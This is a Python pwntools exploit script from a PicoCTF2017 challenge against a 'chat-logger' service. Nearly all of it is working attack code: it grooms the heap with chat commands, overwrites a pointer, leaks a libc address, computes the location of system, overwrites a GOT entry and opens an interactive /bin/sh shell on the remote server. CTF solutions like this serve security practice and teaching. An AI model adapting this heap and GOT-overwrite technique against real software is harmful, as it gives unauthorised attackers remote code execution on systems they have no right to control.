## exploit_chat-logger.py, by Sudoite
## For PicoCTF2017

from pwn import *
#from os import *
import struct
#from time import sleep

# Helper functions to convert 64-bit addresses to strings and vice versa
pck = lambda x: struct.pack('Q', x)
unpck = lambda x: struct.unpack('Q', x)

# Helper function, adds null bytes to the end of a hex address so we can pack it
def append_nulls(str):
	n = len(str)
	for i in xrange(8 - n):
		str += '\x00'
	return str

#p = process('/home/ctf/Documents/PicoCTF2017/Exploit3/chatlogger/chat-logger')
p = process('nc shell2017.picoctf.com 51628', shell=True)
p.recvuntil("> ")


## Set up heap so we can overwrite a pointer

# Long message to be overwritten
p.send("find 2 I told you my name is Brian\n")
p.recvuntil("> ")

# This message will end up longer than it should be
p.send("add 2 AAAA\n")
p.recvuntil("> ")

# These last two commands place the long message right below "add 2 AAAA\n" on the heap
p.send("find 2 I told you my name is Brian\n")
p.recvuntil("> ")
p.send("add 2 BBBB\n")
p.recvuntil("> ")


## Overwrite the pointer
p.send("find 2 AAAA\n")
p.recvuntil("> ")

#log.info("calling edit AABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL" + pck(0x601e60) + "\n")
# prints as `\x1e`\x00
p.send("edit AABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL`\x1e`\n")
p.recvuntil("> ")

## Leak the libc address
p.send("chat 2\n")
p.recvuntil("5353172790000830793 ") # Note this is IIIIJJJJ as a 64-bit unsigned long

# leaked libc address
addr = p.recvline()
# Strip trailing newline
addr = addr[0:len(addr)-1]

log.info("leaked address = " + addr)


# calculate address of system on server 
strchr_addr = unpck(append_nulls(addr))[0]
server_strchr_offset = 0x7ffa0 # 0x7ff70 # stepping straight into the optimized part of the function
libc_base = strchr_addr - server_strchr_offset
server_system_addr = libc_base + 0x41490

log.info("system addr: " + hex(server_system_addr))
log.info("libc_base: " + hex(libc_base))
log.info("strchr_addr: " + hex(strchr_addr))

# Reposition the address to write to in the GOT -- over to the left by four bytes
p.send("find 2 AABBBB\n")
p.recvuntil("> ")
p.send("edit AABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\\\x1e`\n")
p.recvuntil("> ")


# Next: find our desired message in the chat and overwrite its contents to place
#       a pointer to system in the GOT
libc_address_fragment = str(pck(strchr_addr))[4:6]
log.info("searching for " + libc_address_fragment)

p.send("find 2 "+libc_address_fragment+"\n")
p.recvuntil("> ")

log.info("sending command: edit AA" + pck(server_system_addr)[0:6] + "\n")
p.send("edit AA" + pck(server_system_addr)[0:6] + "\n")

p.recvuntil("> ")
p.send("/bin/sh\n")

# Profit!
p.interactive()